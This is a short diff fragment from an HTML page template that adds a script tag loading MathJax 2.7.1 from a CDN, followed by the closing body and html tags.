+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
